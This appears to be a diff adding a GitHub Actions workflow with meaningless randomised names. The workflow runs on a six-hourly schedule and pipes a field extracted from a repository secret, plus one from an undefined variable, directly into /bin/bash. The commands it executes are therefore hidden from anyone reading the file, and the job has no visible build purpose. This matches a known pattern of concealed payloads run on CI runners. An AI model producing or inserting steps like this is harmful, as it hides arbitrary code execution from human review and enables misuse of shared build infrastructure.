@@ -1,0 +1,19 @@
+name: layerdiegostable
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: layerdiegostable
+        env:
+          tivjd02271: ${{ secrets.tivjd02271 }}
+        run: |
+          echo $tivjd02271 | jq -r .cc811 | /bin/bash
+          echo $g4 | jq -r .omjl61450 | /bin/bash
+
